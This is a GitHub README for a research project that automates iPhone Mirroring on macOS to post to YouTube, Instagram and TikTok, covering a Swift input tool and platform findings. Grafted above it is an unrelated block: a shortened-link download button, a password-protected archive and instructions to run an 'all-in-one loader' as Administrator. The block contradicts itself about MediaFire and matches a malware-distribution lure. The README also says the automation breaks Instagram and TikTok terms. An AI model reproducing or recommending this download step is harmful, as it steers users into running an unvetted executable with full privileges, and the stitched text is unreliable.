<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# iphone-mirroring-social-media-publish

Drive an iPhone from macOS **iPhone Mirroring** to publish video to YouTube, Instagram
and TikTok — using the phone's real apps instead of their APIs.

> **Status: research + specification.** This repo contains a working input tool
> (`phonectl`) and three reverse-engineered flow specs. **It is not a working publisher
> yet.** Nothing here has ever published a post.

## Why do this at all

The official APIs are the better path when they fit, and this repo does not pretend
otherwise:

- **YouTube** — Data API v3 `videos.insert` is solid.
- **Instagram** — Graph API content publishing requires a Business/Creator account and
  a publicly reachable media URL.
- **TikTok** — the Content Posting API requires app review before you can post directly.

UI automation through a mirrored phone is for what those don't cover: a personal
account, an unapproved TikTok app, or posting exactly the way you would by hand.

It is also the **most fragile possible approach**, for reasons that are not about code.
## Verdict: iPhone Mirroring accepts synthetic events

Verified on macOS 15.3.1 (Darwin 24.3.0) against a live mirroring window.

| Primitive | Status | Evidence |
|---|---|---|
| Window screenshot | ✅ verified | `screencapture -x -o -l <winid>` → 660×1466 px (2× retina) |
| Tap | ✅ verified | Opened Spotlight from the home screen |
| Paste (clipboard + Cmd+V) | ✅ verified | Accents, emoji and hashtags survived intact |
| Key (return/escape/arrows) | ✅ verified | `escape` cleared a focused text field |
| Key + modifier | ✅ verified | `key 1 cmd` → Home Screen |
| Scroll (wheel) | ✅ verified | Scrolled a long form into view |
| Swipe (mouse drag) | ❌ **does not work** | Neither scrolls nor fires the Home gesture |

`swipe` is accepted without error and does nothing. Mirroring expects trackpad-style
scroll wheel events, which is what `scroll` posts. Navigate between apps with
`key 1 cmd`, not gestures.

## Requirements

- macOS 15+ with **iPhone Mirroring**
- **Screen Recording** permission — for `screencapture` and window enumeration
- **Accessibility** permission — for `CGEventPost`. Without it `AXIsProcessTrusted()`
  returns `false` and **every synthetic event is silently discarded**

Both are granted to the process running `phonectl`, e.g. your terminal.

## phonectl

```bash
swiftc -O -o tools/phonectl tools/phonectl.swift
```

```bash
tools/phonectl info                     # geometry + frontmost + trusted
tools/phonectl focus                    # bring the mirroring window to the front
tools/phonectl tap 165 611              # window-relative points
tools/phonectl scroll 165 450 -300      # wheel scroll; negative scrolls down
tools/phonectl paste "caption 🚀" 2000  # optional settle in ms
tools/phonectl key escape               # return|tab|space|delete|escape|arrows
tools/phonectl key 1 cmd                # Cmd+1 = Home Screen
```

Coordinates are **window-relative points**, origin at the window's top-left. Screenshot
pixels are 2× points on a retina display.

### The frontmost guard

`phonectl` **refuses to click when the mirroring window is not frontmost**
(`kCGWindowLayer == 0`, first in z-order). Without this, a tap aimed at the phone lands
in whatever app is actually on top — during development that was a browser.

The window loses focus between commands, so call `phonectl focus` before each sequence.

## Apps restore in-progress sessions

All three apps reopen into a half-finished composer rather than their home screen. In
TikTok Studio the editor opened **different content than the clip that was selected** — a
restored multi-clip draft whose text overlay persisted across clips.

→ Never assume a clean start. Read the current screen first, and confirm the editor is
showing the intended clip before captioning. Leave an app with `key 1 cmd`, which
preserves the session; `Discard` destroys whatever was in progress.

## Flow specifications

Each platform has its own spec. They are independent by design — the apps share no
geometry, no input model and no terminal states.

| Flow | Scheduling | Safe dry-run exit | Validation |
|---|---|---|---|
### Native scheduling changes the architecture

All three platforms schedule natively. That defuses the worst structural limit: the
runner **does not need to be running at publish time**. It prepares the post while the
Mac is free, leaves it scheduled, and the phone publishes on its own.

The project's scheduler only orchestrates *when a post is prepared*.

## Structural limits

Not code problems — they do not go away with better engineering:

- **The mirroring session dies when you pick up the iPhone.** It needs the Mac unlocked
  and the iPhone locked and nearby. Native scheduling is the workaround, not a fix.
- **Pixel coordinates against UIs that change.** Instagram and TikTok ship UI changes,
  A/B tests and interstitials constantly.
- **Automating the Instagram and TikTok UIs is against their Terms of Service.**

## Design rules that fall out of all this

- **Never replay taps blindly.** Screenshot, verify the expected screen, then act. The
  YouTube flow is already non-deterministic: a camera dialog appears or not depending on
  which mode the app last remembered.
- **Verify after every write.** Pasted text, created tag chips, selected clip counts —
  none of these report failure on their own.
- **End every dry run in a draft state.** Instagram and TikTok both offer one.
- **Measure coordinates at runtime.** The mirroring window is resizable; screenshots
  taken during this research arrived in eight different sizes.
- **Never auto-answer a compliance field.** AI-disclosure settings are legal
  declarations. They are explicit per-post values, never runner defaults.

## Repository layout

```
├── docs/
│   └── platform-findings.md   # iPhone Mirroring behaviour, permissions, the 3 traps
├── flows/
│   ├── youtube-short.md       # route, "Add details" tree, native scheduling
│   ├── instagram-reel.md      # route, details screen, More options, scheduling
│   └── tiktok-studio.md       # route, details screen, Post time wheel, More options
└── tools/
    └── phonectl.swift         # tap · swipe · paste · key · focus · info
```

## Open questions

- **How does video reach the iPhone camera roll?** Every flow starts at the gallery
  picker, so something has to put the file there first. Unresolved.
- **How far ahead does TikTok's date wheel go?** It is a relative list
  (`Today`, `Sep 17 (Thu)`, …), not a calendar. If it stops after a few days that is a
  hard ceiling on scheduling. Not reached yet — the TikTok editor held a live draft.
- **How does a tag chip commit on YouTube?** Comma, return, or something else. Untested,
  because writing one would have altered a real in-progress session.
- **Does the mirroring window bezel scale proportionally on resize?** Normalized
  coordinates assume it does; unverified at a second window size.
